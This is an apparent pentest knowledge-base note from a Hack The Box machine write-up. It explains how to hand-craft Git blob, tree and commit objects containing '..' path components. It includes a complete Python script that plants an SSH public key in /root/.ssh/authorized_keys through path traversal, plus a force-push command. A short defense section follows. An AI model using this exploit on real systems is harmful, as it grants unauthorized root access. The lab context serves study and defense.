---
type: concept
domain: pentest
tags: [git, privesc, bypass, path-traversal]
source: Nexus HTB machine
---

## What it is
Raw Git object crafting is a technique for writing Git tree/blob/commit objects directly to `.git/objects/` — bypassing the client-side path validation that `git add`, `git mktree`, and similar porcelain commands enforce. This allows creating commits that contain files with paths containing `..` components, which normal Git commands refuse to create.

## How it works

Git's object model stores content as blobs (files), trees (directories), and commits. Porcelain commands like `git add` validate path names and refuse `..` components. But the underlying format is just zlib-compressed data keyed by SHA-1 hash — you can write any object you want directly by:

1. Constructing the raw object header (`blob <size>\0<content>`)
2. SHA-1 hashing it
3. zlib-compressing it
4. Writing it to `.git/objects/<sha1[:2]>/<sha1[2:]>`
5. Building a tree object that references the blob with a traversal path
6. Building a commit pointing at the tree
7. Updating a branch ref to point at the commit

When a server-side script then processes the repo with `git ls-tree -r HEAD`, it outputs the crafted paths including `..` components — and if the consuming code doesn't sanitize those paths, the traversal is exploited.

## Example / commands

**`build.py` — used in Nexus privesc:**
```python
#!/usr/bin/env python3
import hashlib, zlib, os, subprocess, time

def write_obj(data, t):
    header = ("%s %d" % (t, len(data))).encode() + b"\x00"
    store = header + data
    sha = hashlib.sha1(store).hexdigest()
    dirpath = os.path.join(".git", "objects", sha[:2])
    os.makedirs(dirpath, exist_ok=True)
    fpath = os.path.join(dirpath, sha[2:])
    if not os.path.exists(fpath):
        open(fpath, "wb").write(zlib.compress(store))
    return sha

def entry(mode, name, sha):
    return ("%s %s" % (mode, name)).encode() + b"\x00" + bytes.fromhex(sha)

# Create blob with SSH public key content
key = open("/tmp/rootkey.pub").read().strip() + "\n"
blob = write_obj(key.encode(), "blob")
readme = write_obj(b"# Template\n", "blob")

# Build nested tree: .ssh/authorized_keys
ssh_tree  = write_obj(entry("100644", "authorized_keys", blob), "tree")
root_tree = write_obj(entry("40000", ".ssh", ssh_tree), "tree")
depth     = write_obj(entry("40000", "root", root_tree), "tree")

# Wrap in 4 levels of ".." to escape the staging dir
for _ in range(4):
    depth = write_obj(entry("40000", "..", depth), "tree")

# Root tree also includes a normal README.md
final = write_obj(entry("100644", "README.md", readme) + entry("40000", "..", depth), "tree")

ts = int(time.time())
commit_data = "tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n" % (final, ts, ts)
sha = write_obj(commit_data.encode(), "commit")

os.makedirs(os.path.join(".git", "refs", "heads"), exist_ok=True)
open(os.path.join(".git", "refs", "heads", "main"), "w").write(sha + "\n")
print("Done:", sha)
```

Push to server:
```bash
git push 'http://user:pass@git.target.htb/user/repo.git' main --force
```

> **Pitfall:** Copy-pasting this script from certain sources may introduce invisible U+00A0 non-breaking spaces, causing `SyntaxError: invalid non-printable character`. Fix with:
> ```bash
> sed -i 's/\xc2\xa0/ /g' build.py
> ```

## Defense & detection

- **Server-side path sanitization** — any service consuming `git ls-tree` output must normalize and validate each path before using it in file system operations (see [[Path Traversal]])
- **Chroot / sandboxing** — run git-processing services in a container or chroot so file writes are bounded
- Signing commits (GPG) does not prevent this — object crafting produces valid unsigned commits

## Related
- [[Path Traversal]]
- [[Nexus htb machine]]
